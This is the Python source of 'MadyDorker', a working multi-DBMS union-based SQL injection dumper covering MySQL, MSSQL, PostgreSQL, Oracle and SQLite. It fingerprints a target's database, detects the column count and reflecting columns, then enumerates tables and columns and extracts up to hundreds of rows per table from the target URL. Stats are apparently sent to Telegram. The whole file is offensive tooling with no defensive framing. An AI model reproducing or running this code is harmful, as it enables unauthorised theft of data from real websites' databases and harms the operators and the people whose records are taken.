"""
MadyDorker v3.12 — Multi-DBMS Union-Based Data Dumper

Enhanced union injection extraction for:
- MySQL / MariaDB   (GROUP_CONCAT, information_schema)
- MSSQL             (STRING_AGG / FOR XML PATH, sys.tables / INFORMATION_SCHEMA)
- PostgreSQL        (STRING_AGG / ARRAY_AGG, pg_tables / information_schema)
- Oracle            (LISTAGG / UTL_RAW, ALL_TABLES / ALL_TAB_COLUMNS)
- SQLite            (GROUP_CONCAT, sqlite_master)

Features:
- Automatic DBMS fingerprinting via union error patterns
- Column-count detection (ORDER BY binary search + NULL probing)
- Injectable column discovery (marker injection)
- Adaptive concatenation (per-DBMS string aggregation)
- Pagination-safe extraction (OFFSET/FETCH, LIMIT, ROWNUM)
- Comment style selection per DBMS
- Hex encoding for evasion
"""

import asyncio
import logging
import random
import re
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import quote, urlparse

import aiohttp

logger = logging.getLogger("union_dumper")


# ═══════════════════════════════════════════════════════════════
#   DATA CLASSES
# ═══════════════════════════════════════════════════════════════

@dataclass
class UnionProfile:
    """Union injection profile for a specific target."""
    url: str
    parameter: str
    dbms: str = ""
    column_count: int = 0
    injectable_columns: List[int] = field(default_factory=list)
    comment: str = "-- -"
    string_col: int = -1  # Best column for string output
    prefix: str = "'"    # Injection prefix (', ", etc.)
    suffix: str = ""     # Injection suffix
    is_numeric: bool = False  # Numeric injection (no quotes)


@dataclass
class UnionDumpResult:
    """Result from union-based extraction."""
    url: str
    dbms: str = ""
    version: str = ""
    current_user: str = ""
    current_db: str = ""
    hostname: str = ""
    tables: Dict[str, List[str]] = field(default_factory=dict)
    data: Dict[str, List[Dict]] = field(default_factory=dict)
    rows_extracted: int = 0
    requests_made: int = 0
    elapsed: float = 0.0
    error: Optional[str] = None

    @property
    def total_tables(self) -> int:
        return len(self.tables)

    @property
    def total_columns(self) -> int:
        return sum(len(cols) for cols in self.tables.values())


# ═══════════════════════════════════════════════════════════════
#   DBMS-SPECIFIC SQL FRAGMENTS
# ═══════════════════════════════════════════════════════════════

# --- Version queries ---
VERSION_QUERIES = {
    "mysql":      "VERSION()",
    "mssql":      "@@VERSION",
    "postgresql": "VERSION()",
    "oracle":     "(SELECT banner FROM v$version WHERE ROWNUM=1)",
    "sqlite":     "SQLITE_VERSION()",
}

# --- Current user ---
USER_QUERIES = {
    "mysql":      "CURRENT_USER()",
    "mssql":      "SYSTEM_USER",
    "postgresql": "CURRENT_USER",
    "oracle":     "USER",
    "sqlite":     "'sqlite'",
}

# --- Current database ---
DB_QUERIES = {
    "mysql":      "DATABASE()",
    "mssql":      "DB_NAME()",
    "postgresql": "CURRENT_DATABASE()",
    "oracle":     "(SELECT ora_database_name FROM DUAL)",
    "sqlite":     "'main'",
}

# --- Hostname ---
HOST_QUERIES = {
    "mysql":      "@@HOSTNAME",
    "mssql":      "@@SERVERNAME",
    "postgresql": "INET_SERVER_ADDR()",
    "oracle":     "SYS_CONTEXT('USERENV','HOST')",
    "sqlite":     "'localhost'",
}

# --- Table enumeration ---
TABLE_ENUM = {
    "mysql": {
        "query": "SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE()",
        "group": "GROUP_CONCAT(table_name SEPARATOR 0x2c)",
        "from":  "information_schema.tables",
        "where": "table_schema=DATABASE()",
    },
    "mssql": {
        "query": "SELECT name FROM sysobjects WHERE xtype='U'",
        "group": "STRING_AGG(name,',')",
        "group_fallback": "STUFF((SELECT ','+name FROM sysobjects WHERE xtype='U' FOR XML PATH('')),1,1,'')",
        "from":  "sysobjects",
        "where": "xtype='U'",
    },
    "postgresql": {
        "query": "SELECT tablename FROM pg_tables WHERE schemaname='public'",
        "group": "STRING_AGG(tablename,',')",
        "from":  "pg_tables",
        "where": "schemaname='public'",
    },
    "oracle": {
        "query": "SELECT table_name FROM user_tables",
        "group": "LISTAGG(table_name,',') WITHIN GROUP(ORDER BY table_name)",
        "from":  "user_tables",
        "where": "ROWNUM<=200",
    },
    "sqlite": {
        "query": "SELECT name FROM sqlite_master WHERE type='table'",
        "group": "GROUP_CONCAT(name,',')",
        "from":  "sqlite_master",
        "where": "type='table'",
    },
}

# --- Column enumeration ---
COLUMN_ENUM = {
    "mysql": {
        "group": "GROUP_CONCAT(column_name SEPARATOR 0x2c)",
        "from":  "information_schema.columns",
        "where": "table_schema=DATABASE() AND table_name='{table}'",
    },
    "mssql": {
        "group": "STRING_AGG(column_name,',')",
        "group_fallback": "STUFF((SELECT ','+column_name FROM information_schema.columns WHERE table_name='{table}' FOR XML PATH('')),1,1,'')",
        "from":  "information_schema.columns",
        "where": "table_name='{table}'",
    },
    "postgresql": {
        "group": "STRING_AGG(column_name,',')",
        "from":  "information_schema.columns",
        "where": "table_name='{table}'",
    },
    "oracle": {
        "group": "LISTAGG(column_name,',') WITHIN GROUP(ORDER BY column_id)",
        "from":  "all_tab_columns",
        "where": "table_name=UPPER('{table}') AND owner=USER",
    },
    "sqlite": {
        "special": True,  # Uses PRAGMA table_info
        "group": "GROUP_CONCAT(name,',')",
        "from":  "pragma_table_info('{table}')",
        "where": "1=1",
    },
}

# --- Data extraction concat ---
DATA_CONCAT = {
    "mysql": {
        "concat": "CONCAT_WS(0x7c7c,{columns})",
        "group":  "GROUP_CONCAT({row_expr} SEPARATOR 0x3c62723e)",
        "null_wrap": "IFNULL({col},'NULL')",
        "limit":  "LIMIT {offset},{count}",
    },
    "mssql": {
        "concat": "{columns_plus}",  # col1+CHAR(124)+CHAR(124)+col2
        "group":  "STRING_AGG({row_expr},CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62))",
        "group_fallback":  "STUFF((SELECT CHAR(60)+CHAR(98)+CHAR(114)+CHAR(62)+{row_expr} FROM {table} {where} ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT {count} ROWS ONLY FOR XML PATH('')),1,4,'')",
        "null_wrap": "ISNULL(CAST({col} AS VARCHAR(MAX)),'NULL')",
        "limit":  "ORDER BY 1 OFFSET {offset} ROWS FETCH NEXT {count} ROWS ONLY",
    },
    "postgresql": {
        "concat": "CONCAT_WS('||',{columns})",
        "group":  "STRING_AGG({row_expr},'<br>')",
        "null_wrap": "COALESCE(CAST({col} AS TEXT),'NULL')",
        "limit":  "LIMIT {count} OFFSET {offset}",
    },
    "oracle": {
        "concat": "{columns_pipe}",  # col1||'||'||col2
        "group":  "LISTAGG({row_expr},'<br>') WITHIN GROUP(ORDER BY ROWNUM)",
        "null_wrap": "NVL(TO_CHAR({col}),'NULL')",
        "limit":  "WHERE ROWNUM BETWEEN {offset_plus1} AND {offset_plus_count}",
    },
    "sqlite": {
        "concat": "{columns}",  # col1||'||'||col2
        "group":  "GROUP_CONCAT({row_expr},'<br>')",
        "null_wrap": "COALESCE({col},'NULL')",
        "limit":  "LIMIT {count} OFFSET {offset}",
    },
}

# --- Comment styles ---
COMMENTS = {
    "mysql":      ["-- -", "#", "-- "],
    "mssql":      ["-- -", "--"],
    "postgresql": ["-- -", "--"],
    "oracle":     ["-- -", "--"],
    "sqlite":     ["-- -", "--"],
}

# --- DBMS error patterns for fingerprinting ---
DBMS_ERRORS = {
    "mysql": [
        r"You have an error in your SQL syntax",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"com\.mysql\.jdbc",
        r"MariaDB",
    ],
    "mssql": [
        r"Unclosed quotation mark",
        r"Microsoft SQL",
        r"ODBC SQL Server",
        r"SQLServer JDBC",
        r"mssql_query",
        r"Incorrect syntax near",
    ],
    "postgresql": [
        r"PostgreSQL.*ERROR",
        r"PSQLException",
        r"org\.postgresql",
        r"pg_query",
        r"unterminated quoted string",
    ],
    "oracle": [
        r"ORA-\d{5}",
        r"Oracle.*Driver",
        r"oracle\.jdbc",
        r"quoted string not properly terminated",
    ],
    "sqlite": [
        r"SQLite.*error",
        r"sqlite3\.OperationalError",
        r"SQLITE_ERROR",
        r"unrecognized token",
    ],
}


# ═══════════════════════════════════════════════════════════════
#   MULTI-DBMS UNION DUMPER
# ═══════════════════════════════════════════════════════════════

class MultiUnionDumper:
    """
    Multi-DBMS union-based SQL injection data extractor.

    Workflow:
    1. Fingerprint DBMS from error patterns
    2. Detect column count via ORDER BY binary search
    3. Discover injectable columns via marker injection
    4. Extract: version, user, database, hostname
    5. Enumerate tables → filter high-value → enumerate columns
    6. Extract data with DBMS-specific pagination

    Config fields read:
        union_dump_enabled: bool (True)
        union_dump_max_tables: int (30)
        union_dump_max_rows: int (500)
        union_dump_timeout: float (15.0)
        union_dump_max_columns_per_table: int (30)
    """

    def __init__(self, config: Any = None, scanner: Any = None):
        self.config = config
        self.scanner = scanner

        # Config
        self.enabled = True
        self.max_tables = 30
        self.max_rows = 500
        self.timeout = 15.0
        self.max_cols_per_table = 30

        if config:
            self.enabled = getattr(config, "union_dump_enabled", True)
            self.max_tables = getattr(config, "union_dump_max_tables", 30)
            self.max_rows = getattr(config, "union_dump_max_rows", 500)
            self.timeout = getattr(config, "union_dump_timeout", 15.0)
            self.max_cols_per_table = getattr(config, "union_dump_max_columns_per_table", 30)

        # Stats
        self.stats = {
            "dumps_run": 0,
            "tables_enumerated": 0,
            "rows_extracted": 0,
            "requests_made": 0,
            "dbms_detected": {"mysql": 0, "mssql": 0, "postgresql": 0, "oracle": 0, "sqlite": 0},
        }

    # ─────────────────────────────────────────────
    #   PUBLIC API
    # ─────────────────────────────────────────────

    async def dump(
        self,
        url: str,
        parameter: str,
        session: aiohttp.ClientSession,
        dbms_hint: str = "",
        column_count: int = 0,
        injectable_columns: Optional[List[int]] = None,
        prefix: str = "'",
    ) -> UnionDumpResult:
        """
        Full union-based dump pipeline.

        Args:
            url: Target URL with injectable parameter
            parameter: Injectable parameter name
            session: aiohttp session
            dbms_hint: Known DBMS (skip fingerprinting)
            column_count: Known column count (skip detection)
            injectable_columns: Known injectable columns (skip discovery)
            prefix: Injection prefix (' or " or numeric)

        Returns:
            UnionDumpResult with everything extracted
        """
        start_time = time.time()
        result = UnionDumpResult(url=url)
        self.stats["dumps_run"] += 1

        try:
            # Build profile
            profile = UnionProfile(
                url=url,
                parameter=parameter,
                prefix=prefix,
            )

            # Step 1: Fingerprint DBMS
            if dbms_hint:
                profile.dbms = dbms_hint.lower()
            else:
                profile.dbms = await self._fingerprint_dbms(profile, session)
            result.dbms = profile.dbms
            self.stats["dbms_detected"][profile.dbms] = self.stats["dbms_detected"].get(profile.dbms, 0) + 1

            # Set comment style
            profile.comment = COMMENTS.get(profile.dbms, ["-- -"])[0]

            # Step 2: Detect column count
            if column_count > 0:
                profile.column_count = column_count
            else:
                profile.column_count = await self._detect_columns(profile, session)
            if profile.column_count == 0:
                result.error = "Could not detect column count"
                return result

            # Step 3: Find injectable columns
            if injectable_columns:
                profile.injectable_columns = injectable_columns
                profile.string_col = injectable_columns[0]
            else:
                profile.injectable_columns = await self._find_injectable(profile, session)
            if not profile.injectable_columns:
                result.error = "No injectable columns found"
                return result
            profile.string_col = profile.injectable_columns[0]

            # Step 4: Extract metadata
            result.version = await self._extract_single(
                profile, session, VERSION_QUERIES.get(profile.dbms, "VERSION()")
            )
            result.current_user = await self._extract_single(
                profile, session, USER_QUERIES.get(profile.dbms, "USER()")
            )
            result.current_db = await self._extract_single(
                profile, session, DB_QUERIES.get(profile.dbms, "DATABASE()")
            )
            result.hostname = await self._extract_single(
                profile, session, HOST_QUERIES.get(profile.dbms, "@@HOSTNAME")
            )

            logger.info(
                f"[{profile.dbms}] v={result.version[:40]} "
                f"u={result.current_user} db={result.current_db}"
            )

            # Step 5: Enumerate tables
            tables = await self._enum_tables(profile, session)
            self.stats["tables_enumerated"] += len(tables)

            # Step 6: Enumerate columns for each table
            for table in tables[:self.max_tables]:
                cols = await self._enum_columns(profile, session, table)
                if cols:
                    result.tables[table] = cols[:self.max_cols_per_table]

            # Step 7: Extract data from high-value tables
            for table, columns in result.tables.items():
                rows = await self._extract_rows(profile, session, table, columns)
                if rows:
                    result.data[table] = rows
                    result.rows_extracted += len(rows)
                    self.stats["rows_extracted"] += len(rows)

        except Exception as e:
            result.error = str(e)
            logger.error(f"Union dump error: {e}")

        result.requests_made = self.stats["requests_made"]
        result.elapsed = time.time() - start_time
        return result

    async def dump_from_sqli(
        self,
        sqli_result: Any,
        session: aiohttp.ClientSession,
    ) -> UnionDumpResult:
        """
        Dump from an existing SQLiResult object (from sqli_scanner).
        Reuses its detected DBMS, column count, and injectable columns.
        """
        return await self.dump(
            url=sqli_result.url,
            parameter=sqli_result.parameter,
            session=session,
            dbms_hint=getattr(sqli_result, "dbms", ""),
            column_count=getattr(sqli_result, "column_count", 0),
            injectable_columns=getattr(sqli_result, "injectable_columns", None),
            prefix=getattr(sqli_result, "prefix", "'"),
        )

    def get_stats_text(self) -> str:
        """Human-readable stats for Telegram."""
        s = self.stats
        dbms_text = ", ".join(
            f"{k}: {v}" for k, v in s["dbms_detected"].items() if v > 0
        )
        return (
            "🔓 <b>Multi-DBMS Union Dumper</b>\n"
            f"Dumps run: <b>{s['dumps_run']}</b>\n"
            f"Tables enumerated: <b>{s['tables_enumerated']}</b>\n"
            f"Rows extracted: <b>{s['rows_extracted']}</b>\n"
            f"Requests: <b>{s['requests_made']}</b>\n"
            f"DBMS: {dbms_text or 'none yet'}"
        )

    # ─────────────────────────────────────────────
    #   FINGERPRINTING
    # ─────────────────────────────────────────────

    async def _fingerprint_dbms(
        self, profile: UnionProfile, session: aiohttp.ClientSession
    ) -> str:
        """Detect DBMS from error page patterns."""
        # Send a deliberately broken query
        payloads = [
            f"{profile.prefix}\"",
            f"{profile.prefix})",
            f"{profile.prefix} AND 1=CONVERT(int, 'x')",
        ]

        for payload in payloads:
            test_url = self._inject(profile, payload)
            body = await self._fetch(test_url, session)
            if not body:
                continue

            for dbms, patterns in DBMS_ERRORS.items():
                for pattern in patterns:
                    if re.search(pattern, body, re.I):
                        logger.info(f"DBMS fingerprint: {dbms}")
                        return dbms

        # Fallback: try DBMS-specific functions
        for dbms, version_expr in VERSION_QUERIES.items():
            if dbms == "oracle":
                continue  # Oracle needs special handling
            val = await self._extract_single(profile, session, version_expr)
            if val:
                if "maria" in val.lower() or "mysql" in val.lower():
                    return "mysql"
                if "microsoft" in val.lower() or "sql server" in val.lower():
                    return "mssql"
                if "postgresql" in val.lower() or "postgres" in val.lower():
                    return "postgresql"
                if "sqlite" in val.lower():
                    return "sqlite"

        return "mysql"  # Default assumption

    # ─────────────────────────────────────────────
    #   COLUMN COUNT DETECTION
    # ─────────────────────────────────────────────

    async def _detect_columns(
        self, profile: UnionProfile, session: aiohttp.ClientSession
    ) -> int:
        """Detect number of columns using ORDER BY binary search."""
        # Binary search with ORDER BY
        low, high = 1, 50
        last_valid = 0

        while low <= high:
            mid = (low + high) // 2
            payload = f"{profile.prefix} ORDER BY {mid}{profile.comment}"
            test_url = self._inject(profile, payload)
            body = await self._fetch(test_url, session)

            if body and not self._is_error(body):
                last_valid = mid
                low = mid + 1
            else:
                high = mid - 1

        if last_valid > 0:
            logger.info(f"Column count (ORDER BY): {last_valid}")
            return last_valid

        # Fallback: UNION SELECT NULL probing
        for n in range(1, 30):
            nulls = ",".join(["NULL"] * n)
            payload = f"{profile.prefix} UNION SELECT {nulls}{profile.comment}"
            test_url = self._inject(profile, payload)
            body = await self._fetch(test_url, session)

            if body and not self._is_error(body):
                logger.info(f"Column count (NULL probe): {n}")
                return n

        return 0

    # ─────────────────────────────────────────────
    #   INJECTABLE COLUMN DISCOVERY
    # ─────────────────────────────────────────────

    async def _find_injectable(
        self, profile: UnionProfile, session: aiohttp.ClientSession
    ) -> List[int]:
        """Find which columns reflect output (injectable for data extraction)."""
        nulls = ["NULL"] * profile.column_count
        injectable = []
        marker_base = random.randint(700000, 799999)

        # Insert unique markers in each column, check which reflect
        for i in range(profile.column_count):
            marker = str(marker_base + i)
            marker_hex = marker.encode().hex()  # "700042" → "373030303432" (valid hex for ASCII)
            test_nulls = nulls.copy()
            # Try string marker (proper hex-encoded ASCII so MySQL returns readable string)
            test_nulls[i] = f"CONCAT(0x{marker_hex},0x{marker_hex})"
            payload = f"{profile.prefix} UNION SELECT {','.join(test_nulls)}{profile.comment}"
            test_url = self._inject(profile, payload)
            body = await self._fetch(test_url, session)

            if body and (marker + marker) in body:
                injectable.append(i)
                continue

            # Try numeric marker
            test_nulls[i] = marker
            payload = f"{profile.prefix} UNION SELECT {','.join(test_nulls)}{profile.comment}"
            test_url = self._inject(profile, payload)
            body = await self._fetch(test_url, session)

            if body and marker in body:
                injectable.append(i)

        logger.info(f"Injectable columns: {injectable}")
        return injectable

    # ─────────────────────────────────────────────
    #   SINGLE VALUE EXTRACTION
    # ─────────────────────────────────────────────

    async def _extract_single(
        self, profile: UnionProfile, session: aiohttp.ClientSession,
        expression: str,
    ) -> str:
        """Extract a single value via union injection."""
        if profile.column_count == 0 or profile.string_col < 0:
            return ""

        marker_start_str = f"mu{random.randint(10000, 99999)}"
        marker_end_str = f"mv{random.randint(10000, 99999)}"
        marker_start_hex = marker_start_str.encode().hex()
        marker_end_hex = marker_end_str.encode().hex()

        nulls = ["NULL"] * profile.column_count
        if profile.dbms == "oracle":
            # Oracle: NULL must be typed or use FROM DUAL
            nulls[profile.string_col] = (
                f"CONCAT(CONCAT(CHR({self._str_to_chr(marker_start_str)}),"
                f"{expression}),"
                f"CHR({self._str_to_chr(marker_end_str)}))"
            )
            payload = (
                f"{profile.prefix} UNION SELECT {','.join(nulls)} "
                f"FROM DUAL{profile.comment}"
            )
        elif profile.dbms == "sqlite":
            nulls[profile.string_col] = (
                f"'{marker_start_str}'||({expression})||'{marker_end_str}'"
            )
            payload = f"{profile.prefix} UNION SELECT {','.join(nulls)}{profile.comment}"
        else:
            nulls[profile.string_col] = (
                f"CONCAT(0x{marker_start_hex},{expression},0x{marker_end_hex})"
            )
            payload = f"{profile.prefix} UNION SELECT {','.join(nulls)}{profile.comment}"

        test_url = self._inject(profile, payload)
        body = await self._fetch(test_url, session)

        if body:
            match = re.search(rf'{re.escape(marker_start_str)}(.+?){re.escape(marker_end_str)}', body, re.S)
            if match:
                return match.group(1).strip()

        return ""

    # ─────────────────────────────────────────────
    #   TABLE ENUMERATION
    # ─────────────────────────────────────────────

    async def _enum_tables(
        self, profile: UnionProfile, session: aiohttp.ClientSession
    ) -> List[str]:
        """Enumerate database tables."""
        dbms = profile.dbms
        t_info = TABLE_ENUM.get(dbms)
        if not t_info:
            return []

        # Method 1: GROUP aggregation in a single query
        group_expr = t_info["group"]
        raw = await self._extract_via_union_agg(
            profile, session, group_expr, t_info["from"], t_info["where"]
        )

        if not raw and "group_fallback" in t_info:
            # MSSQL fallback: FOR XML PATH
            raw = await self._extract_single(
                profile, session, t_info["group_fallback"]
            )

        if raw:
            tables = [t.strip() for t in raw.split(",") if t.strip()]
            logger.info(f"Enumerated {len(tables)} tables via aggregation")
            return tables

        # Method 2: Row-by-row extraction
        tables = []
        for offset in range(0, 200, 20):
            batch = await self._extract_rows_raw(
                profile, session,
                columns=["table_name"] if dbms != "sqlite" else ["name"],
                from_clause=t_info["from"],
                where=t_info["where"],
                offset=offset,
                count=20,
            )
            for row in batch:
                val = list(row.values())[0] if row else ""
                if val and val != "NULL":
                    tables.append(val)
            if len(batch) < 20:
                break

        logger.info(f"Enumerated {len(tables)} tables via row-by-row")
        return tables

    # ─────────────────────────────────────────────
    #   COLUMN ENUMERATION
    # ─────────────────────────────────────────────

    async def _enum_columns(
        self, profile: UnionProfile, session: aiohttp.ClientSession,
        table: str,
    ) -> List[str]:
        """Enumerate columns for a table."""
        dbms = profile.dbms
        c_info = COLUMN_ENUM.get(dbms)
        if not c_info:
            return []

        where = c_info["where"].format(table=table)
        group_expr = c_info["group"].format(table=table)
        from_clause = c_info["from"].format(table=table)

        raw = await self._extract_via_union_agg(
            profile, session, group_expr, from_clause, where
        )

        if not raw and "group_fallback" in c_info:
            fallback = c_info["group_fallback"].format(table=table)
            raw = await self._extract_single(profile, session, fallback)

        if raw:
            columns = [c.strip() for c in raw.split(",") if c.strip()]
            return columns

        # Row-by-row fallback
        columns = []
        col_name = "name" if c_info.get("special") else "column_name"
        for offset in range(0, 200, 20):
            batch = await self._extract_rows_raw(
                profile, session,
                columns=[col_name],
                from_clause=from_clause,
                where=where,
                offset=offset,
                count=20,
            )
            for row in batch:
                val = list(row.values())[0] if row else ""
                if val and val != "NULL":
                    columns.append(val)
            if len(batch) < 20:
                break

        return columns

    # ─────────────────────────────────────────────
    #   DATA EXTRACTION
    # ─────────────────────────────────────────────

    async def _extract_rows(
        self, profile: UnionProfile, session: aiohttp.ClientSession,
        table: str, columns: List[str],
    ) -> List[Dict[str, str]]:
        """Extract data rows from a table."""
        all_rows: List[Dict[str, str]] = []
        batch_size = 20
        dbms = profile.dbms
        d_info = DATA_CONCAT.get(dbms)
        if not d_info:
            return []

        # Build column concat expression
        wrapped_cols = [
            d_info["null_wrap"].format(col=c) for c in columns
        ]

        if dbms == "mysql":
            row_expr = f"CONCAT_WS(0x7c7c,{','.join(wrapped_cols)})"
        elif dbms == "mssql":
            row_expr = "+CHAR(124)+CHAR(124)+".join(wrapped_cols)
        elif dbms == "postgresql":
            row_expr = f"CONCAT_WS('||',{','.join(wrapped_cols)})"
        elif dbms == "oracle":
            row_expr = "||'||'||".join(wrapped_cols)
        elif dbms == "sqlite":
            row_expr = "||'||'||".join(wrapped_cols)
        else:
            row_expr = ",".join(wrapped_cols)

        for offset in range(0, self.max_rows, batch_size):
            # Method 1: Aggregated extraction
            batch_rows = await self._extract_agg_rows(
                profile, session, row_expr, table,
                columns, offset, batch_size,
            )

            if batch_rows:
                all_rows.extend(batch_rows)
                if len(batch_rows) < batch_size:
                    break
            else:
                # Method 2: Row-by-row extraction
                raw_rows = await self._extract_rows_raw(
                    profile, session, columns, table,
                    where="1=1", offset=offset, count=batch_size,
                )
                if raw_rows:
                    all_rows.extend(raw_rows)
                    if len(raw_rows) < batch_size:
                        break
                else:
                    break

            await asyncio.sleep(0.3)

        logger.info(f"Extracted {len(all_rows)} rows from {table}")
        return all_rows

    async def _extract_agg_rows(
        self, profile: UnionProfile, session: aiohttp.ClientSession,
        row_expr: str, table: str, columns: List[str],
        offset: int, count: int,
    ) -> List[Dict[str, str]]:
        """Extract rows via GROUP/STRING_AGG aggregation."""
        dbms = profile.dbms
        d_info = DATA_CONCAT.get(dbms, {})
        rows = []

        # Build sub-select with pagination
        if dbms == "mysql":
            agg_expr = f"GROUP_CONCAT({row_expr} SEPARATOR '<br>')"
            sub_query = (
                f"(SELECT {agg_expr} FROM "
                f"(SELECT * FROM {table} LIMIT {offset},{count}) AS sub)"
            )
        elif dbms == "mssql":
            agg_expr = f"STRING_AGG({row_expr},'<br>')"
            sub_query = (
                f"(SELECT {agg_expr} FROM "
                f"(SELECT *, ROW_NUMBER() OVER(ORDER BY (SELECT NULL)) AS rn "
                f"FROM {table}) AS sub WHERE rn BETWEEN {offset+1} AND {offset+count})"
            )
        elif dbms == "postgresql":
            agg_expr = f"STRING_AGG({row_expr},'<br>')"
            sub_query = (
                f"(SELECT {agg_expr} FROM "
                f"(SELECT * FROM {table} LIMIT {count} OFFSET {offset}) AS sub)"
            )
        elif dbms == "oracle":
            agg_expr = f"LISTAGG({row_expr},'<br>') WITHIN GROUP(ORDER BY ROWNUM)"
            sub_query = (
                f"(SELECT {agg_expr} FROM "
                f"(SELECT t.*, ROWNUM AS rn FROM {table} t WHERE ROWNUM<={offset+count}) "
                f"WHERE rn>{offset})"
            )
        elif dbms == "sqlite":
            agg_expr = f"GROUP_CONCAT({row_expr},'<br>')"
            sub_query = (
                f"(SELECT {agg_expr} FROM "
                f"(SELECT * FROM {table} LIMIT {count} OFFSET {offset}))"
            )
        else:
            return []

        raw = await self._extract_single(profile, session, sub_query)
        if raw:
            for raw_row in raw.split("<br>"):
                raw_row = raw_row.strip()
                if not raw_row:
                    continue
                values = raw_row.split("||")
                if len(values) == len(columns):
                    rows.append({columns[i]: values[i] for i in range(len(columns))})
                elif len(values) >= 1:
                    # Partial match — store what we can
                    row = {}
                    for i, col in enumerate(columns):
                        row[col] = values[i] if i < len(values) else ""
                    rows.append(row)

        return rows

    async def _extract_rows_raw(
        self, profile: UnionProfile, session: aiohttp.ClientSession,
        columns: List[str], from_clause: str, where: str = "1=1",
        offset: int = 0, count: int = 20,
    ) -> List[Dict[str, str]]:
        """Extract rows one-by-one via LIMIT/OFFSET union injections."""
        dbms = profile.dbms
        rows = []

        for i in range(count):
            row_offset = offset + i
            row = {}

            for col in columns[:5]:  # Limit columns per row-by-row request
                if dbms == "mysql":
                    expr = f"(SELECT {col} FROM {from_clause} WHERE {where} LIMIT {row_offset},1)"
                elif dbms == "mssql":
                    expr = (
                        f"(SELECT {col} FROM {from_clause} WHERE {where} "
                        f"ORDER BY 1 OFFSET {row_offset} ROWS FETCH NEXT 1 ROWS ONLY)"
                    )
                elif dbms == "postgresql":
                    expr = f"(SELECT {col} FROM {from_clause} WHERE {where} LIMIT 1 OFFSET {row_offset})"
                elif dbms == "oracle":
                    expr = (
                        f"(SELECT {col} FROM (SELECT {col}, ROWNUM AS rn "
                        f"FROM {from_clause} WHERE {where}) WHERE rn={row_offset+1})"
                    )
                elif dbms == "sqlite":
                    expr = f"(SELECT {col} FROM {from_clause} WHERE {where} LIMIT 1 OFFSET {row_offset})"
                else:
                    continue

                val = await self._extract_single(profile, session, expr)
                if val:
                    row[col] = val

            if row:
                rows.append(row)
            else:
                break  # No more rows

        return rows

    # ─────────────────────────────────────────────
    #   HELPERS
    # ─────────────────────────────────────────────

    async def _extract_via_union_agg(
        self, profile: UnionProfile, session: aiohttp.ClientSession,
        group_expr: str, from_clause: str, where: str,
    ) -> str:
        """Extract aggregated value (GROUP_CONCAT/STRING_AGG etc) via union."""
        sub = f"(SELECT {group_expr} FROM {from_clause} WHERE {where})"
        return await self._extract_single(profile, session, sub)

    def _inject(self, profile: UnionProfile, payload: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(profile.url)
        if not parsed.query:
            return ""

        params = parsed.query.split("&")
        new_params = []
        for p in params:
            if "=" in p:
                name, val = p.split("=", 1)
                if name == profile.parameter:
                    new_params.append(f"{name}={quote(val + payload)}")
                else:
                    new_params.append(p)
            else:
                new_params.append(p)

        new_query = "&".join(new_params)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    async def _fetch(self, url: str, session: aiohttp.ClientSession) -> str:
        """Fetch URL body, tracking request count."""
        if not url:
            return ""
        self.stats["requests_made"] += 1
        try:
            async with session.get(
                url, ssl=False, allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                return await resp.text(errors="replace")
        except Exception:
            return ""

    def _is_error(self, body: str) -> bool:
        """Check if response indicates SQL error."""
        error_indicators = [
            "Unknown column",
            "column not found",
            "ORDER BY position",
            "number of columns",
            "each UNION query must have the same number",
            "UNION, INTERSECT or EXCEPT",
            "SELECTs to the left and right",
            "query block has incorrect number",
        ]
        body_lower = body.lower()
        return any(e.lower() in body_lower for e in error_indicators)

    @staticmethod
    def _str_to_chr(s: str) -> str:
        """Convert string to CHR() concatenation for Oracle."""
        return "||".join(f"CHR({ord(c)})" for c in s)
